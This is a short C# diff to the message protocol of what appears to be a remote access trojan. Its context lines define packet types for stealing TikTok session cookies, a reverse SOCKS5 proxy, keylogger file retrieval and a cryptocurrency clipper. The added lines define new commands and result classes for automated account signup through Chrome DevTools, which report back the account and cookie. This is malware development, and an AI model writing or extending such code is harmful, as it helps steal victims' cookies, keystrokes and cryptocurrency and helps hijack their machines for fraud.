@@ -114,6 +114,9 @@ public enum PacketType
     TikTokCommentAck   = 211,  // client→server: {Success, Error}
     TikTokDetectCookie = 212,  // server→client: detect session on machine
     TikTokCookieResult = 213,  // client→server: {Cookie, Found}
+    CdpSignupStart     = 220,  // server→client: start Chrome CDP auto-signup
+    CdpSignupStatus    = 221,  // client→server: {Step, Message} progress
+    CdpSignupResult    = 222,  // client→server: {Success, Account, Cookie, Error}
 
     // Reverse SOCKS5 Proxy
     SocksStart  = 200,  // server→client: {LocalPort} — open SOCKS5 listener on server side
@@ -407,6 +410,10 @@ public class KeyloggerFilesResultData
 }
 public class KeyloggerGetFileData     { public string Filename { get; set; } = string.Empty; }
 public class KeyloggerFileContentData { public string Filename { get; set; } = string.Empty; public string Content { get; set; } = string.Empty; }
+
+// ── CDP Signup ────────────────────────────────────────
+public class CdpSignupStatusData { public string Step { get; set; } = string.Empty; public string Message { get; set; } = string.Empty; }
+public class CdpSignupResultData  { public bool Success { get; set; } public string Account { get; set; } = string.Empty; public string Cookie { get; set; } = string.Empty; public string Error { get; set; } = string.Empty; }
 
 // ── Crypto Clipper ────────────────────────────────────
 public class ClipperAddresses
